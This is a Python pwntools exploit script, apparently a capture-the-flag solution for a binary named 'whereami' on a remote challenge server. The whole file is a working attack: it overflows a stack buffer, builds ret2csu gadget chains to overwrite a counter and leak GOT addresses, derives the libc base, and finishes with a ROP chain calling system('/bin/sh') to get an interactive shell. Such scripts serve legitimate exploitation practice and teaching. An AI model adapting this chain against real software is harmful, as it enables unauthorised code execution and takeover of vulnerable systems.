#!/usr/local/bin/python3

from pwn import *
from LibcSearcher import *

context.log_level = 'debug'
context.terminal = ['wt.exe', '-w', '1', 'split-pane', 'wsl.exe', '-d', 'Ubuntu']

puts_got = 0x0000000000404018
start = 0x0000000000401110
counter = 0x000000000040406C
gets_got = 0x0000000000404038
start_got = 0x0000000000403FF0
pop_rdi = 0x401303
ret = 0x401304


# ret2csu
def ret2csu(vuln_buffer_size, add_esp_value, num_of_pop, r15, r12, r13, r14, rbp = 1, rbx = 0, ret = 0):
    '''
    construct ret2csu payload, 从左到右对应libc_csu_init中的最后从下到上的寄存器
    @param vuln_buffer_size: the size of vuln buffer
    @param add_esp_value: the value of add esp in libc_csu_init
    @r15: hijack function address, often got.plt address
    @r14-r12: arguments of hijack function
    @rbp: call instruction idx, should be 0
    @rbx: condition, should be 1, then `add esi, 1; cmp ebx, esi` can bypass
    @ret: return address
    '''
    # num_of_pop = 6
    libc_csu_init_gadget1 = 0x00000000004012F6
    libc_csu_init_gadget2 = 0x00000000004012E0


    payload = b'A'*vuln_buffer_size + b'D'*8 + p64(libc_csu_init_gadget1)
    payload += b'B'*add_esp_value + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(libc_csu_init_gadget2)
    payload += b'B'*(add_esp_value + num_of_pop*8) + p64(ret)

    return payload

def main():
    # choose remote or local
    libc = ELF('./whereami_libc.so.6')
    if sys.argv[1] == "remote":
        r = remote("challs.actf.co", 31222)
    else:
        r = process("./whereami")
        # gdb.attach(r, '''
        # b main
        # ''')
    # override bss counter
    payload = ret2csu(0x40, 8, 6, gets_got, counter, 0, 0, 1, 0, start)
    r.recvuntil(b"Who are you? ")
    r.sendline(payload)
    r.recvuntil("I hope you find yourself too.\n")
    r.send(b'\x01\xff\xff\xff\xff\xff\xff\xff\n')

    payload = ret2csu(0x40, 8, 6, puts_got, puts_got, 0, 0, 1, 0, start)
    r.recvuntil(b"Who are you? ")
    r.sendline(payload)
    r.recvuntil("I hope you find yourself too.\n")
    puts_addr = r.recvline()[:-1].ljust(8, b'\x00')
    log.info("puts_addr: " + hex(u64(puts_addr)))

    payload = ret2csu(0x40, 8, 6, puts_got, start_got, 0, 0, 1, 0, start)
    r.recvuntil(b"Who are you? ")
    r.sendline(payload)
    r.recvuntil("I hope you find yourself too.\n")
    libc_start_main_addr = r.recvline()[:-1].ljust(8, b'\x00')
    log.info("libc_start_main_addr: " + hex(u64(libc_start_main_addr)))

    # obj = LibcSearcher("__libc_start_main", u64(libc_start_main_addr))
    system_addr = libc.symbols['system']
    log.info("system addr: {}".format(hex(system_addr)))
    binsh_addr = next(libc.search(b"/bin/sh"))
    # binsh_addr = 0x1b45bd
    log.info("/bin/sh addr: {}".format(hex(binsh_addr)))
    libc_base = u64(libc_start_main_addr) - libc.symbols['__libc_start_main']
    log.info("libc base: {}".format(hex(libc_base)))

    system_addr = system_addr + libc_base
    binsh_addr = binsh_addr + libc_base
    log.info("system addr: {}".format(hex(system_addr)))
    log.info("/bin/sh addr: {}".format(hex(binsh_addr)))

    # # print bin_sh if correct
    # payload = ret2csu(0x40, 8, 6, puts_got, binsh_addr, 0, 0, 1, 0, start)
    # r.recvuntil(b"Who are you? ")
    # r.sendline(payload)
    # r.recvuntil("I hope you find yourself too.\n")
    # bin_sh_correct = r.recvline()
    # log.info("bin_sh_correct: {}".format(bin_sh_correct))

    # hijack system
    payload = b"A" * 0x48 + p64(ret) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
    r.recvuntil(b"Who are you? ")
    r.sendline(payload)

    r.interactive()

if __name__ == "__main__":
    main()